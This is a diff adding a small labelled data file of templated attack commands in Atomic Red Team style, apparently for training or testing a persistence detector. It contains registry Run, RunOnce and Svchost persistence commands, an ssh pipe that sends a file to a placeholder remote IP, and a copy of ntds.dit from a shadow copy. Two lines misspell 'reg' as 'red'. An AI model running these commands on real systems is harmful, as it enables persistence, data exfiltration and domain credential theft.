@@ -1,0 +1,6 @@
+1	red add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /f /d "${command_to_execute}"
+1	red add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /V "Atomic Red Team" /t REG_SZ /f /d "${command_to_execute}"
+1	reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v "Atomic Red Team" /t REG_MULTI_SZ /d "${command_to_execute}" /f
+0	mstsc /v:${ip_address} /f
+0	cat ${source_file_path} | ssh ${username}@${ip_address} 'cat > ${destination_file_path}'
+0	copy ${shadow_copy_path}\windows\ntds\ntds.dit ${local_file_path}
